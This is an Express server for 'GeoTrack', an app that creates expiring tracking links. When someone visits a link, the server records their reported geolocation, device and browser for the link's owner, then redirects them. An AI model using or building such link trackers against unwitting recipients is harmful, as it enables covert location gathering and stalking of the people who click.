const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const { createCanvas } = require('@napi-rs/canvas');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');

const app = express();
const PORT = process.env.PORT || 3000;

// ── Database setup ──────────────────────────────────────────────────
const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

const usersDb = low(new FileSync(path.join(dataDir, 'users.json')));
const linksDb = low(new FileSync(path.join(dataDir, 'links.json')));

usersDb.defaults({ users: [] }).write();
linksDb.defaults({ links: [] }).write();

// ── Middleware ──────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'geotrack_secret_' + Math.random(),
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 } // 7 days
}));

// Auth middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ error: 'Not logged in' });
  next();
}

// ── CAPTCHA generation ──────────────────────────────────────────────
const captchaSessions = {}; // { token: { answer, expires } }

app.get('/api/captcha', (req, res) => {
  const num1 = Math.floor(Math.random() * 9) + 1;
  const num2 = Math.floor(Math.random() * 9) + 1;
  const answer = num1 + num2;
  const token = uuidv4();

  captchaSessions[token] = {
    answer: String(answer),
    expires: Date.now() + 5 * 60 * 1000
  };

  // Clean old tokens
  Object.keys(captchaSessions).forEach(k => {
    if (captchaSessions[k].expires < Date.now()) delete captchaSessions[k];
  });

  // Generate image
  const W = 160, H = 52;
  const canvas = createCanvas(W, H);
  const ctx = canvas.getContext('2d');

  // Background
  ctx.fillStyle = '#0f1117';
  ctx.fillRect(0, 0, W, H);

  // Grid lines
  ctx.strokeStyle = 'rgba(0,255,136,0.08)';
  ctx.lineWidth = 1;
  for (let x = 0; x < W; x += 16) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, H); ctx.stroke(); }
  for (let y = 0; y < H; y += 16) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke(); }

  // Noise dots
  for (let i = 0; i < 40; i++) {
    ctx.fillStyle = `rgba(0,255,136,${Math.random() * 0.3})`;
    ctx.fillRect(Math.random() * W, Math.random() * H, 2, 2);
  }

  // Wavy lines
  for (let l = 0; l < 3; l++) {
    ctx.strokeStyle = `rgba(0,255,136,${0.1 + Math.random() * 0.15})`;
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(0, Math.random() * H);
    for (let x = 0; x < W; x += 10) {
      ctx.lineTo(x, (H / 2) + Math.sin(x * 0.1 + l) * 15 + (Math.random() - 0.5) * 10);
    }
    ctx.stroke();
  }

  // Math question
  const text = `${num1} + ${num2} = ?`;
  ctx.font = 'bold 22px monospace';
  ctx.fillStyle = '#00ff88';

  // Slight per-char rotation
  const chars = text.split('');
  let xPos = 12;
  chars.forEach(ch => {
    ctx.save();
    const angle = (Math.random() - 0.5) * 0.25;
    ctx.translate(xPos, H / 2 + 7);
    ctx.rotate(angle);
    ctx.fillText(ch, 0, 0);
    ctx.restore();
    xPos += ctx.measureText(ch).width + 1;
  });

  const buf = canvas.toBuffer('image/png');
  res.set({
    'Content-Type': 'image/png',
    'X-Captcha-Token': token,
    'Cache-Control': 'no-store'
  });
  res.send(buf);
});

// ── AUTH routes ─────────────────────────────────────────────────────
app.post('/api/signup', async (req, res) => {
  try {
    const { name, email, password, confirmPassword, captchaToken, captchaAnswer } = req.body;

    if (!name || !email || !password || !confirmPassword)
      return res.status(400).json({ error: 'All fields are required' });
    if (password !== confirmPassword)
      return res.status(400).json({ error: 'Passwords do not match' });
    if (password.length < 6)
      return res.status(400).json({ error: 'Password must be at least 6 characters' });

    // Verify captcha
    const cap = captchaSessions[captchaToken];
    if (!cap || cap.expires < Date.now())
      return res.status(400).json({ error: 'Captcha expired — please refresh' });
    if (cap.answer !== String(captchaAnswer).trim())
      return res.status(400).json({ error: 'Wrong captcha answer' });
    delete captchaSessions[captchaToken];

    // Check duplicate email
    const existing = usersDb.get('users').find({ email: email.toLowerCase() }).value();
    if (existing) return res.status(400).json({ error: 'Email already registered' });

    const hash = await bcrypt.hash(password, 10);
    const user = {
      id: uuidv4(),
      name: name.trim(),
      email: email.toLowerCase().trim(),
      password: hash,
      createdAt: new Date().toISOString()
    };
    usersDb.get('users').push(user).write();

    req.session.userId = user.id;
    req.session.userName = user.name;

    res.json({ ok: true, name: user.name });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const user = usersDb.get('users').find({ email: email.toLowerCase().trim() }).value();
    if (!user) return res.status(401).json({ error: 'Invalid email or password' });

    const match = await bcrypt.compare(password, user.password);
    if (!match) return res.status(401).json({ error: 'Invalid email or password' });

    req.session.userId = user.id;
    req.session.userName = user.name;
    res.json({ ok: true, name: user.name });
  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get('/api/me', (req, res) => {
  if (!req.session.userId) return res.json({ loggedIn: false });
  res.json({ loggedIn: true, name: req.session.userName, id: req.session.userId });
});

// ── LINK routes ─────────────────────────────────────────────────────
app.post('/api/links/create', requireAuth, (req, res) => {
  let { dest, expiresIn } = req.body; // expiresIn in hours
  if (!dest) return res.status(400).json({ error: 'Destination URL required' });
  if (!/^https?:\/\//i.test(dest)) dest = 'https://' + dest;

  const hours = parseInt(expiresIn) || 1;
  const id = uuidv4().replace(/-/g, '').substr(0, 10);
  const expiresAt = new Date(Date.now() + hours * 60 * 60 * 1000).toISOString();

  const link = {
    id,
    userId: req.session.userId,
    dest,
    expiresIn: hours,
    expiresAt,
    createdAt: new Date().toISOString(),
    hits: []
  };

  linksDb.get('links').push(link).write();
  const trackUrl = `${req.protocol}://${req.get('host')}/go/${id}`;
  res.json({ id, trackUrl, expiresAt });
});

app.get('/api/links', requireAuth, (req, res) => {
  const links = linksDb.get('links')
    .filter({ userId: req.session.userId })
    .value()
    .map(l => ({
      id: l.id,
      dest: l.dest,
      expiresAt: l.expiresAt,
      createdAt: l.createdAt,
      expired: new Date(l.expiresAt) < new Date(),
      hitCount: l.hits.length,
      lastHit: l.hits.at(-1)?.time || null
    }))
    .reverse();
  res.json(links);
});

app.get('/api/links/:id/hits', requireAuth, (req, res) => {
  const link = linksDb.get('links').find({ id: req.params.id }).value();
  if (!link) return res.status(404).json({ error: 'Not found' });
  if (link.userId !== req.session.userId) return res.status(403).json({ error: 'Forbidden' });
  res.json({
    dest: link.dest,
    expiresAt: link.expiresAt,
    expired: new Date(link.expiresAt) < new Date(),
    hits: link.hits
  });
});

app.delete('/api/links/:id', requireAuth, (req, res) => {
  const link = linksDb.get('links').find({ id: req.params.id }).value();
  if (!link) return res.status(404).json({ error: 'Not found' });
  if (link.userId !== req.session.userId) return res.status(403).json({ error: 'Forbidden' });
  linksDb.get('links').remove({ id: req.params.id }).write();
  res.json({ ok: true });
});

// ── TRACKING routes ─────────────────────────────────────────────────
app.get('/go/:id', (req, res) => {
  const link = linksDb.get('links').find({ id: req.params.id }).value();
  if (!link) return res.sendFile(path.join(__dirname, 'public', 'expired.html'));
  if (new Date(link.expiresAt) < new Date())
    return res.sendFile(path.join(__dirname, 'public', 'expired.html'));
  res.sendFile(path.join(__dirname, 'public', 'landing.html'));
});

app.post('/api/hit/:id', (req, res) => {
  const link = linksDb.get('links').find({ id: req.params.id }).value();
  if (!link) return res.status(404).json({ error: 'not found' });
  if (new Date(link.expiresAt) < new Date()) return res.status(410).json({ error: 'expired' });

  const { lat, lon, acc } = req.body;
  const ua = req.headers['user-agent'] || '';

  // Parse device info from UA
  let device = 'Unknown';
  let browser = 'Unknown';
  if (/iPhone|iPad/.test(ua)) device = /iPad/.test(ua) ? 'iPad' : 'iPhone';
  else if (/Android/.test(ua)) device = 'Android';
  else if (/Windows/.test(ua)) device = 'Windows PC';
  else if (/Mac/.test(ua)) device = 'Mac';
  else if (/Linux/.test(ua)) device = 'Linux';

  if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = 'Chrome';
  else if (/Firefox\//.test(ua)) browser = 'Firefox';
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
  else if (/Edg\//.test(ua)) browser = 'Edge';
  else if (/OPR\//.test(ua)) browser = 'Opera';

  const hit = {
    lat: lat || null,
    lon: lon || null,
    acc: acc || null,
    device,
    browser,
    time: new Date().toISOString()
  };

  linksDb.get('links').find({ id: req.params.id }).get('hits').push(hit).write();
  console.log(`[HIT] ${req.params.id} → ${lat}, ${lon} | ${device} / ${browser}`);
  res.json({ dest: link.dest });
});

// ── SERVE SPA pages ─────────────────────────────────────────────────
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));

app.listen(PORT, () => console.log(`GeoTrack running → http://localhost:${PORT}`));
